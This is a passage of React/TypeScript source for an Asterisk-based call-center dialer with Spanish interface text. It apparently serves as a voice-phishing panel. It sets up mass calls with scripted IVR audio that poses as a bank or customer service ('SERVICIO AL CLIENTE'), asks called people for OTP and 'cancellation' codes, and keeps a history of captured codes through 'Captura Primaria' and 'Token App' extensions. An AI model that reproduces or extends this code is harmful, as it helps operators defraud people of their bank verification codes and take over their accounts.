    if (e) e.preventDefault();
    if (!newLeadNumber.trim()) return;
    const cleanNum = newLeadNumber.replace(/[^0-9]/g, '');
    const newLead: CampaignLead = {
      id: 'lead-' + Date.now(),
      number: cleanNum,
      name: newLeadName.trim() || undefined,
      notes: newLeadNotes.trim() || undefined,
      status: 'pending',
    };

    setDialingCampaigns((prev) => {
      const updated = prev.map((c) => {
        if (c.id === selectedCampaignId) {
          return { ...c, leads: [...c.leads, newLead] };
        }
        return c;
      });
      try {
        localStorage.setItem('ast20_dialing_campaigns_v2', JSON.stringify(updated));
      } catch (_) {}
      return updated;
    });

    // Also auto-load this number into the dialer
    setTargetNumber(cleanNum);
    if (newLeadName.trim()) setTargetName(newLeadName.trim());

    setNewLeadNumber('');
    setNewLeadName('');
    setNewLeadNotes('');
    setIsAddingLeadModalOpen(false);
    setCampaignFeedback(`✓ Contacto ${cleanNum} agregado a la campaña y listo para marcar.`);
    setTimeout(() => setCampaignFeedback(null), 3500);
  };

  // Remove lead from campaign
  const handleDeleteLeadFromCampaign = (campaignId: string, leadId: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setDialingCampaigns((prev) => {
      const updated = prev.map((c) => {
        if (c.id === campaignId) {
          return { ...c, leads: c.leads.filter((l) => l.id !== leadId) };
        }
        return c;
      });
      try {
        localStorage.setItem('ast20_dialing_campaigns_v2', JSON.stringify(updated));
      } catch (_) {}
      return updated;
    });
  };

  const handleSaveAndLockCurrentEntity = async () => {
    const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
    if (!current) return;
    setIsEntitySaving(true);
    const targetAgent = agentExtension || '1001';
    try {
      // 1. Mark entity as locked (isLocked: true) and update state if admin
      const updatedEntities = campaignEntities.map((ent) =>
        ent.id === current.id ? { ...ent, isLocked: true } : ent
      );
      setCampaignEntities(updatedEntities);

      // 2. Persist in localStorage for this agent and globally
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updatedEntities));
      localStorage.setItem('prod_selected_service_v3', current.id);
      localStorage.setItem('prod_selected_service_' + targetAgent, current.id);

      // 3. Register manual lock in server API ONLY if Super Admin
      if (isSuperAdmin) {
        fetch('/api/asterisk/audio/toggle-lock', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ role: 'ivr_entity', isLocked: true }),
        }).catch(() => {});
      }

      // 4. Sync audios to AstDB for Asterisk isolated by Call Center (tenantId) & Agent
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: current.introAudioPath,
          prompt: current.promptAudioPath,
          wait: current.waitAudioPath || 'custom/un_momento_validando_informacion',
          success: current.successAudioPath || 'custom/operacion_bloqueada_exito',
          agent: current.agentAudioPath || 'custom/conectar_asesor',
          cancelWait: current.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          otpVerifyWait: current.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
          holdMusic: current.holdMusicAudioPath || 'default',
          destination: targetNumber.trim() || '16104803845',
          agentId: targetAgent,
          tenantId: resolvedWorkspaceTenantId || undefined,
          isManualSave: true,
          isAdmin: isSuperAdmin,
          isSuperAdmin,
        }),
      });

      setIsEntitySaved(true);
      const feedbackMsg = isSuperAdmin
        ? `✓ Guión "${current.name}" guardado y sincronizado (Ext. ${targetAgent} y Sistema). Protegido contra sobreescritura.`
        : `✓ Guión "${current.name}" seleccionado para trabajar hoy${resolvedWorkspaceTenantId ? ' en tu Call Center' : ''} (Ext. ${targetAgent}) sin cruzarse con otros Call Centers.`;
      setAudioSyncFeedback(feedbackMsg);
      setTimeout(() => {
        setIsEntitySaved(false);
        setAudioSyncFeedback(null);
      }, 5000);
    } catch (err: any) {
      setAudioSyncFeedback(`Guión guardado localmente.`);
      setTimeout(() => setAudioSyncFeedback(null), 3000);
    } finally {
      setIsEntitySaving(false);
    }
  };

  const handleUnlockCurrentEntity = async () => {
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede desbloquear el catálogo de guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
    if (!current) return;
    try {
      const updatedEntities = campaignEntities.map((ent) =>
        ent.id === current.id ? { ...ent, isLocked: false } : ent
      );
      setCampaignEntities(updatedEntities);
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updatedEntities));

      fetch('/api/asterisk/audio/toggle-lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: 'ivr_entity', isLocked: false }),
      }).catch(() => {});

      setAudioSyncFeedback(`🔓 Guión "${current.name}" desbloqueado. Ahora permite sincronización automática.`);
      setTimeout(() => setAudioSyncFeedback(null), 4000);
    } catch (e) {}
  };

  // Modal for editing an entity and its assigned audios
  const [editingEntity, setEditingEntity] = useState<CampaignEntity | null>(null);
  const [isEntityModalOpen, setIsEntityModalOpen] = useState(false);

  // Quick inline rename states directly on cards
  const [inlineRenamingId, setInlineRenamingId] = useState<string | null>(null);
  const [inlineNameVal, setInlineNameVal] = useState('');
  const [inlineSubtitleVal, setInlineSubtitleVal] = useState('');
  // State to track entity delete confirmation
  const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null);

  const handleStartInlineRename = (ent: CampaignEntity, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede editar o renombrar guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    setInlineRenamingId(ent.id);
    setInlineNameVal(ent.name);
    setInlineSubtitleVal(ent.subtitle || '');
  };

  const handleSaveInlineRename = (entityId: string, e?: React.MouseEvent | React.KeyboardEvent) => {
    if (e) e.stopPropagation();
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede renombrar guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      setInlineRenamingId(null);
      return;
    }
    if (!inlineNameVal.trim()) {
      setInlineRenamingId(null);
      return;
    }
    const nextEntities = campaignEntities.map((ent) => {
      if (ent.id === entityId) {
        return {
          ...ent,
          name: inlineNameVal.trim(),
          subtitle: inlineSubtitleVal.trim(),
        };
      }
      return ent;
    });
    setCampaignEntities(nextEntities);
    try {
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(nextEntities));
    } catch (err) {}
    pushIvrWorkspaceToServer({ campaignEntities: nextEntities });
    setInlineRenamingId(null);
  };

  const handleCancelInlineRename = (e?: React.MouseEvent | React.KeyboardEvent) => {
    if (e) e.stopPropagation();
    setInlineRenamingId(null);
  };

  // Ultra-safe default audio configuration
  const safeDefaultAudioConfig: CampaignAudioConfig = {
    introAudioPath: 'custom/bienvenida_corporativa',
    promptAudioPath: 'custom/solicitar_codigo_otp',
    agentAudioPath: 'custom/conectar_asesor',
    successAudioPath: 'custom/operacion_bloqueada_exito',
    cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
    otpVerifyWaitAudioPath: 'custom/enviando_codigo_verificacion',
  };

  // Derived campaign audio configurations for backward compatibility
  const campaignAudios: Record<string, CampaignAudioConfig> = (campaignEntities || []).reduce((acc, ent) => {
    if (ent && ent.id) {
      acc[ent.id] = {
        introAudioPath: ent.introAudioPath || 'custom/bienvenida_corporativa',
        promptAudioPath: ent.promptAudioPath || 'custom/solicitar_codigo_otp',
        agentAudioPath: ent.agentAudioPath || 'custom/conectar_asesor',
        successAudioPath: ent.successAudioPath || 'custom/operacion_bloqueada_exito',
        cancelCodeAudioPath: ent.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
        otpVerifyWaitAudioPath: ent.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
      };
    }
    return acc;
  }, {} as Record<string, CampaignAudioConfig>);

  // Ensure 'service' and 'bank' aliases always exist to prevent undefined errors
  if (!campaignAudios['service']) {
    campaignAudios['service'] = { ...safeDefaultAudioConfig };
  }
  if (!campaignAudios['bank']) {
    campaignAudios['bank'] = campaignAudios['service'];
  }

  // Safe accessor helper that never returns undefined
  const getServiceAudios = (key?: string): CampaignAudioConfig => {
    if (key && campaignAudios[key]) return campaignAudios[key];
    if (campaignAudios['service']) return campaignAudios['service'];
    if (campaignAudios['bank']) return campaignAudios['bank'];
    const first = Object.values(campaignAudios)[0];
    return first || safeDefaultAudioConfig;
  };

  // Helper to verify if an audio path exists physically in Asterisk
  const verifyAudioOnAsterisk = async (audioPath: string): Promise<boolean> => {
    if (!audioPath) return false;
    try {
      const res = await fetch(`/api/asterisk/audio/verify?path=${encodeURIComponent(audioPath)}`, {
        method: 'HEAD',
      });
      return res.status === 200;
    } catch {
      return false;
    }
  };

  // Update specific audio slot for an entity
  const handleUpdateCampaignAudio = async (
    service: string,
    slot: keyof CampaignAudioConfig,
    audioPath: string
  ) => {
    if (!isAdmin) {
      setAudioSyncFeedback('🔒 Se requieren privilegios de Administrador para modificar los audios del guión.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    const cleanPath = audioPath.trim();
    setCampaignEntities((prev) => {
      const updated = prev.map((ent) => {
        if (ent.id === service) {
          return { ...ent, [slot]: cleanPath };
        }
        return ent;
      });
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });

    // If currently selected, notify and auto-sync in background to Asterisk AstDB
    if (selectedService === service) {
      const current = campaignEntities.find((e) => e.id === service);
      const payload = {
        intro: slot === 'introAudioPath' ? cleanPath : (current?.introAudioPath || ''),
        prompt: slot === 'promptAudioPath' ? cleanPath : (current?.promptAudioPath || ''),
        wait: 'custom/un_momento_validando_informacion',
        success: slot === 'successAudioPath' ? cleanPath : (current?.successAudioPath || ''),
        agent: slot === 'agentAudioPath' ? cleanPath : (current?.agentAudioPath || ''),
        cancelWait: slot === 'cancelCodeAudioPath' ? cleanPath : (current?.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'),
        otpVerifyWait: slot === 'otpVerifyWaitAudioPath' ? cleanPath : (current?.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'),
        destination: targetNumber.trim() || '16104803845',
      };
      
      try {
        await fetch('/api/asterisk/audio/sync-defaults', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        setAudioSyncFeedback(`✓ Audio asignado y sincronizado con Asterisk: ${cleanPath || 'Estándar'}`);
        setTimeout(() => setAudioSyncFeedback(null), 3500);
      } catch {
        setAudioSyncFeedback(`Aviso: Audio guardado localmente.`);
      }
    }
  };

  // Toggle active/inactive visibility for a script in Call Centers & Users
  const handleToggleEntityActive = (entityId: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede activar o desactivar guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    const target = campaignEntities.find((item) => item.id === entityId);
    if (!target) return;
    const nextActive = target.isActive === false;
    const nextList = campaignEntities.map((item) =>
      item.id === entityId ? { ...item, isActive: nextActive } : item
    );
    setCampaignEntities(nextList);
    try {
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(nextList));
    } catch (_) {}
    pushIvrWorkspaceToServer({ campaignEntities: nextList });
    setAudioSyncFeedback(
      nextActive
        ? `✓ Guión "${target.name}" activado. Ahora aparecerá disponible para asignar en Call Centers y Usuarios.`
        : `○ Guión "${target.name}" marcado como Inactivo. Ya no aparecerá en la lista de Call Centers ni Usuarios.`
    );
    setTimeout(() => setAudioSyncFeedback(null), 3500);
  };

  // Save complete entity from modal
  const handleSaveEntity = async (updatedEntity: CampaignEntity) => {
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede guardar cambios en este guión.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      setIsEntityModalOpen(false);
      return;
    }
    const normalizedEntity: CampaignEntity = {
      ...updatedEntity,
      isActive: updatedEntity.isActive !== false,
    };
    const exists = campaignEntities.some((e) => e.id === normalizedEntity.id);
    const nextEntities: CampaignEntity[] = exists
      ? campaignEntities.map((e) => (e.id === normalizedEntity.id ? normalizedEntity : e))
      : [...campaignEntities, normalizedEntity];
    setCampaignEntities(nextEntities);
    try {
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(nextEntities));
    } catch (e) {}
    pushIvrWorkspaceToServer({ campaignEntities: nextEntities });
    setIsEntityModalOpen(false);
    setEditingEntity(null);

    // Apply caller ID only if explicitly synced (provider assigns CallerID by default)
    if (selectedService === normalizedEntity.id) {

      // Auto-sync audios to AstDB
      try {
        await fetch('/api/asterisk/audio/sync-defaults', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            intro: normalizedEntity.introAudioPath,
            prompt: normalizedEntity.promptAudioPath,
            wait: 'custom/un_momento_validando_informacion',
            success: normalizedEntity.successAudioPath,
            agent: normalizedEntity.agentAudioPath,
            cancelWait: normalizedEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
            otpVerifyWait: normalizedEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
            destination: targetNumber.trim() || '16104803845',
          }),
        });
        setAudioSyncFeedback(`✓ Guión "${normalizedEntity.name}" guardado y aplicado en Asterisk AstDB.`);
      } catch {
        setAudioSyncFeedback(`✓ Guión "${normalizedEntity.name}" guardado.`);
      }
      setTimeout(() => setAudioSyncFeedback(null), 4000);
    }
  };

  // Select an entity and sync its attributes
  const handleSelectEntity = async (entity: CampaignEntity) => {
    setSelectedService(entity.id);
    const targetAgent = agentExtension || '1001';
    try {
      localStorage.setItem('prod_selected_service_' + targetAgent, entity.id);
      localStorage.setItem('prod_selected_service_v3', entity.id);
    } catch (_) {}

    // Auto-sync to AstDB isolated to Call Center & agent (never overwrites global/other Call Centers)
    try {
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: entity.introAudioPath,
          prompt: entity.promptAudioPath,
          wait: entity.waitAudioPath || 'custom/un_momento_validando_informacion',
          success: entity.successAudioPath || 'custom/operacion_bloqueada_exito',
          agent: entity.agentAudioPath || 'custom/conectar_asesor',
          cancelWait: entity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          otpVerifyWait: entity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
          holdMusic: entity.holdMusicAudioPath || 'default',
          destination: targetNumber.trim() || '16104803845',
          agentId: targetAgent,
          tenantId: resolvedWorkspaceTenantId || undefined,
          isAdmin: isSuperAdmin,
          isSuperAdmin,
        }),
      });
      setAudioSyncFeedback(`✓ Guión seleccionado para hoy: "${entity.name}" (${resolvedWorkspaceTenantId ? 'aislado en tu Call Center' : `Ext. ${targetAgent}`}).`);
      setTimeout(() => setAudioSyncFeedback(null), 3000);
    } catch {}
  };

  // Add new entity
  const handleAddNewEntity = () => {
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede crear nuevos guiones en el IVR.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    const newId = 'custom_' + Date.now();
    const newEntity: CampaignEntity = {
      id: newId,
      name: 'Nueva Campaña / Servicio',
      subtitle: 'Atención al Cliente',
      icon: 'building',
      color: 'emerald',
      defaultCallerName: 'SERVICIO AL CLIENTE',
      defaultCallerNum: '',
      introAudioPath: 'custom/bienvenida_corporativa',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor',
      successAudioPath: 'custom/operacion_bloqueada_exito',
      cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
      otpVerifyWaitAudioPath: 'custom/enviando_codigo_verificacion',
      holdMusicAudioPath: 'default',
      isActive: true,
    };
    setEditingEntity(newEntity);
    setIsEntityModalOpen(true);
  };

  // Delete entity
  const handleDeleteEntity = (entityId: string) => {
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede eliminar guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    if (campaignEntities.length <= 1) return;
    const nextEntities = campaignEntities.filter((e) => e.id !== entityId);
    setCampaignEntities(nextEntities);
    try {
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(nextEntities));
    } catch (e) {}
    pushIvrWorkspaceToServer({ campaignEntities: nextEntities });
    if (selectedService === entityId) {
      if (nextEntities.length > 0) {
        handleSelectEntity(nextEntities[0]);
      }
    }
    setIsEntityModalOpen(false);
    setEditingEntity(null);
    setConfirmDeleteId(null);
  };

  // Reset to factory defaults
  const handleResetEntities = () => {
    if (!canEditEntityCatalog) {
      setAudioSyncFeedback('🔒 Solo el Super Administrador puede restablecer los guiones.');
      setTimeout(() => setAudioSyncFeedback(null), 3500);
      return;
    }
    if (confirm('¿Restablecer todos los guiones y asignaciones de audio a los valores de fábrica?')) {
      setCampaignEntities(initialCampaignEntities);
      try {
        localStorage.removeItem('prod_campaign_entities_v3');
      } catch (e) {}
      pushIvrWorkspaceToServer({ campaignEntities: initialCampaignEntities });
      const first = initialCampaignEntities[0];
      handleSelectEntity(first);
    }
  };

  // Audio preview playback in browser
  const [playingAudioKey, setPlayingAudioKey] = useState<string | null>(null);
  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);

  const handleTogglePlayAudio = (audioPath: string, keyIdentifier: string) => {
    if (!audioPath) return;

    if (playingAudioKey === keyIdentifier) {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      setPlayingAudioKey(null);
      return;
    }

    if (audioPlayerRef.current) {
      audioPlayerRef.current.pause();
    }

    // Try finding dataUrl from registered audios
    const foundAudio = audios.find((a) => a.asteriskPath === audioPath);
    if (foundAudio && foundAudio.dataUrl) {
      const player = new Audio(foundAudio.dataUrl);
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch((err) => console.log('Audio playback error:', err));
      player.onended = () => setPlayingAudioKey(null);
    } else {
      // Audio is on server disk, stream via API
      const cleanName = audioPath.replace(/^custom\//, '').replace(/\.wav$/, '');
      const player = new Audio(appendAuthTokenToUrl(`/api/asterisk/audio/stream/${cleanName}`));
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch(() => {
        // Fallback demo sound if streaming is unavailable
        const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
        const fallbackPlayer = new Audio(demoSoundUrl);
        audioPlayerRef.current = fallbackPlayer;
        fallbackPlayer.play().catch(() => {});
        fallbackPlayer.onended = () => setPlayingAudioKey(null);
      });
      player.onended = () => setPlayingAudioKey(null);
    }
  };

  // Quick Upload Audio Modal State
  const [isQuickUploadOpen, setIsQuickUploadOpen] = useState(false);
  const [quickUploadSlot, setQuickUploadSlot] = useState<keyof CampaignAudioConfig>('introAudioPath');
  const [quickUploadName, setQuickUploadName] = useState('');
  const [quickUploadFile, setQuickUploadFile] = useState<File | null>(null);
  const [quickUploadDataUrl, setQuickUploadDataUrl] = useState<string | null>(null);
  const [isRecordingQuick, setIsRecordingQuick] = useState(false);
  const [quickRecordTime, setQuickRecordTime] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordTimerRef = useRef<any>(null);

  // Real-time Active Call HUD State
  const [activeCall, setActiveCall] = useState<{
    isActive: boolean;
    number: string;
    name?: string;
    service: string;
    mode?: CallFlowMode;
    status: 'dialing' | 'ringing' | 'in_ivr' | 'pressed_1' | 'asking_cancel_code' | 'otp_captured' | 'transferred' | 'connected' | 'ended';
    capturedOtp?: string;
    otpStatus?: 'valid' | 'invalid' | 'pending';
    cancelDecision?: 'valid' | 'invalid' | 'pending';
    validationNote?: string;
    duration: number;
    channel?: string;
    pressed1Time?: string;
    pressed1At?: number;
    startedAt?: number;
    answeredAt?: number;
    agentExten?: string;
    agent?: string;
  } | null>(null);

  const [isTransferringToOtp, setIsTransferringToOtp] = useState(false);
  const [selectedOtpExten, setSelectedOtpExten] = useState<string>('4001');
  const [dynamicOtpList, setDynamicOtpList] = useState<Array<{ extension: string; name: string }>>([
    { extension: '4001', name: 'Captura Primaria (4001)' },
    { extension: '4002', name: 'Token App (4002)' },
    { extension: '4003', name: 'Alternativa (4003)' },
    { extension: '4004', name: 'Validación SMS (4004)' },
  ]);

  useEffect(() => {
    const loadDynamicOtpExtensions = () => {
      fetch('/api/asterisk/otp-extensions')
        .then((r) => r.json())
        .then((data) => {
          if (data.success && Array.isArray(data.extensions) && data.extensions.length > 0) {
            const list = data.extensions.map((e: any) => ({
              extension: String(e.extension),
              name: e.name || `Ext. ${e.extension}`,
            }));
            setDynamicOtpList(list);
            setSelectedOtpExten((prev) =>
              list.some((item: { extension: string }) => item.extension === prev)
                ? prev
                : list[0].extension
            );
          }
        })
        .catch(() => {});
    };

    loadDynamicOtpExtensions();
    window.addEventListener('otp-extensions-updated', loadDynamicOtpExtensions);
    return () => {
      window.removeEventListener('otp-extensions-updated', loadDynamicOtpExtensions);
    };
  }, []);

  // Audio tone generator for Press 1 detection chime
  const playPress1Chime = () => {
    try {
      const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
      osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.12); // A5
      osc.frequency.setValueAtTime(1046.5, audioCtx.currentTime + 0.25); // C6
      gain.gain.setValueAtTime(0.38, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.55);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.55);
    } catch (_) {}
  };

  const [sendingCancelCodeNum, setSendingCancelCodeNum] = useState<string | null>(null);
  const notifiedCancelPress1Ref = useRef<Set<string>>(new Set());

  const handleNotifyCancelCodeSent = async (targetNum: string, targetAgent?: string) => {
    const cleanNum = String(targetNum || '').replace(/[^0-9]/g, '');
    if (!cleanNum) return;
    setSendingCancelCodeNum(cleanNum);
    try {
      const res = await fetch('/api/asterisk/call/cancel-code-sent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number: cleanNum,
          agent: targetAgent && targetAgent !== 'ringall' ? targetAgent : undefined,
        }),
      });
      const data = await res.json();
      if (data.success) {
        if (activeCall && activeCall.number.replace(/[^0-9]/g, '') === cleanNum) {
          setActiveCall((prev) =>
            prev
              ? {
                  ...prev,
                  status: 'asking_cancel_code',
                  validationNote:
                    '✓ Aviso enviado a Asterisk: el IVR ahora le está solicitando al cliente que digite el código de cancelación.',
                }
              : null
          );
        }
        setLaunchFeedback({
          text: `✓ Aviso enviado para ${cleanNum}. El IVR ahora le pide al cliente digitar el código de cancelación.`,
          type: 'success',
        });
      }
    } catch (_) {}
    finally {
      setSendingCancelCodeNum(null);
    }
  };

  // History of captured OTPs
  const [otpRecords, setOtpRecords] = useState<CapturedOtpRecord[]>([]);
  const [isLoadingRecords, setIsLoadingRecords] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [isHangingUp, setIsHangingUp] = useState(false);
  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' | 'info' } | null>(null);
  const [isSyncingAudios, setIsSyncingAudios] = useState(false);
  const [audioSyncFeedback, setAudioSyncFeedback] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const enabledCarriers = carriers.filter((c) => c && c.enabled !== false && c.status !== 'disabled');

  // Resolve Call Center Tenant assigned to this user (never narrow SuperAdmin to a tenant)
  const userTenant = React.useMemo(() => {
    if (isSuperAdmin || !tenants || tenants.length === 0) return null;
    if (activeUser?.tenantId) {
      const byId = tenants.find((t) => t.id === activeUser.tenantId);
      if (byId) return byId;
    }
    const extNum = parseInt(agentExtension || userAssignedExt || '', 10);
    if (!isNaN(extNum)) {
      return tenants.find((t) => extNum >= t.extensionStart && extNum <= t.extensionEnd) || null;
    }
    return null;
  }, [isSuperAdmin, tenants, activeUser?.tenantId, agentExtension, userAssignedExt]);

  // Extensiones que pertenecen exclusivamente al Call Center del usuario (para aislar Ring-All en llamadas masivas)
  const tenantScopedExtensions = React.useMemo(() => {
    if (!userTenant) return extensions.map((e) => e.extension);
    const inRange = extensions
      .filter((e) => {
        const n = parseInt(String(e.extension || '').trim(), 10);
        return !isNaN(n) && n >= userTenant.extensionStart && n <= userTenant.extensionEnd;
      })
      .map((e) => e.extension);
    return inRange.length > 0 ? inRange : (activeUser?.assignedExtensions || []);
  }, [extensions, userTenant, activeUser?.assignedExtensions]);

  const visibleAgentExtensions = React.useMemo(() => {
    if (!userTenant) return extensions;
    return extensions.filter((e) => tenantScopedExtensions.includes(e.extension));
  }, [extensions, userTenant, tenantScopedExtensions]);

  // Guiones / Entidades permitidos para este Call Center y/o Usuario (sin cruce con otros Call Centers o clientes)
  const effectiveAssignedEntityIds = React.useMemo(() => {
    if (isSuperAdmin) return null;
    const userAssigned = Array.isArray(activeUser?.assignedEntityIds) ? activeUser.assignedEntityIds : null;
    const tenantAssigned =
      userTenant && Array.isArray(userTenant.assignedEntityIds)
        ? userTenant.assignedEntityIds
        : Array.isArray(tenantServerAssignedIds)
        ? tenantServerAssignedIds
        : null;
    if (userAssigned && tenantAssigned) {
      return userAssigned.filter((id) => tenantAssigned.includes(id));
    }
    if (userAssigned) return userAssigned;
    if (tenantAssigned) return tenantAssigned;
    return null;
  }, [isSuperAdmin, activeUser?.assignedEntityIds, userTenant, tenantServerAssignedIds]);

  const visibleCampaignEntities = React.useMemo(() => {
    if (isSuperAdmin) return campaignEntities;
    const activeOnes = campaignEntities.filter((ent) => ent.isActive !== false);
    if (!Array.isArray(effectiveAssignedEntityIds)) return activeOnes;
    return activeOnes.filter((ent) => effectiveAssignedEntityIds.includes(ent.id));
  }, [isSuperAdmin, campaignEntities, effectiveAssignedEntityIds]);

  const canEditEntityCatalog = isSuperAdmin || (isAdmin && !userTenant);

  // Centro de Llamadas Masivas: solo disponible para Super Administrador o clientes habilitados explícitamente por el Administrador
  const canRunMassCalls = React.useMemo(() => {
    if (isSuperAdmin) return true;
    if (!activeUser) return false;
    if (activeUser.permissions?.canUseMassCalls === true) return true;
    if (userTenant?.allowMassCalls === true && activeUser.role !== 'agent') return true;
    if (serverCanUseMassCalls === true) return true;
    return false;
  }, [isSuperAdmin, activeUser, userTenant?.allowMassCalls, serverCanUseMassCalls]);

  useEffect(() => {
    if (!canRunMassCalls && productionMode === 'mass_campaign') {
      setProductionMode('single');
    }
    if (!isSuperAdmin && productionMode === 'ivr_action') {
      setProductionMode('single');
    }
  }, [canRunMassCalls, isSuperAdmin, productionMode]);

  // Planes de marcación asignados por el Super Administrador (el cliente solo puede usar los autorizados)
  const adminAllowedCallFlowModes = React.useMemo<CallFlowMode[]>(() => {
    if (isSuperAdmin) return ALL_CALL_FLOW_MODES;
    const mapModes = (arr?: CallFlowMode[] | null) =>
      Array.isArray(arr) && arr.length > 0
        ? Array.from(new Set<CallFlowMode>(arr.map((m) => normalizeUiFlowMode(m)).filter((m) => ALL_CALL_FLOW_MODES.includes(m))))
        : null;
    const fromUser = mapModes(activeUser?.allowedCallFlowModes);
    const fromTenant = mapModes(userTenant?.allowedCallFlowModes);
    const fromServer = mapModes(serverAllowedFlowModes);
    const primary = normalizeUiFlowMode(
      activeUser?.assignedCallFlowMode ||
      userTenant?.assignedCallFlowMode ||
      serverAssignedFlowMode ||
      'cancel_code'
    );
    const baseList = fromUser || fromTenant || fromServer || [primary];
    return Array.from(new Set<CallFlowMode>([primary, ...baseList]));
  }, [
    isSuperAdmin,
    activeUser?.allowedCallFlowModes,
    activeUser?.assignedCallFlowMode,
    userTenant?.allowedCallFlowModes,
    userTenant?.assignedCallFlowMode,
    serverAllowedFlowModes,
    serverAssignedFlowMode,
  ]);

  const adminAssignedCallFlowMode: CallFlowMode = React.useMemo(() => {
    if (isSuperAdmin) return callFlowMode;
    return (
      activeUser?.assignedCallFlowMode ||
      userTenant?.assignedCallFlowMode ||
      serverAssignedFlowMode ||
      adminAllowedCallFlowModes[0] ||
      'cancel_code'
    );
  }, [
    isSuperAdmin,
    callFlowMode,
    activeUser?.assignedCallFlowMode,
    userTenant?.assignedCallFlowMode,
    serverAssignedFlowMode,
    adminAllowedCallFlowModes,
  ]);

  useEffect(() => {
    allowedFlowModesRef.current = adminAllowedCallFlowModes;
    if (!isSuperAdmin && !adminAllowedCallFlowModes.includes(callFlowMode)) {
      setCallFlowModeState(adminAssignedCallFlowMode);
      try {
        localStorage.setItem('ast20_call_flow_mode', adminAssignedCallFlowMode);
      } catch (_) {}
    }
  }, [isSuperAdmin, adminAllowedCallFlowModes, adminAssignedCallFlowMode, callFlowMode]);

  // Asegurar que la entidad seleccionada pertenezca estrictamente a los guiones asignados al Call Center
  useEffect(() => {
    if (!Array.isArray(effectiveAssignedEntityIds)) return;
    if (visibleCampaignEntities.length > 0 && !visibleCampaignEntities.some((e) => e.id === selectedService)) {
      const firstValid = visibleCampaignEntities[0];
      setSelectedService(firstValid.id);
      try {
        localStorage.setItem('prod_selected_service_v3', firstValid.id);
      } catch (_) {}
    } else if (visibleCampaignEntities.length === 0 && selectedService !== '') {
      setSelectedService('');
    }
  }, [effectiveAssignedEntityIds, visibleCampaignEntities, selectedService]);

  const defaultAssignedCarrier = React.useMemo(() => {
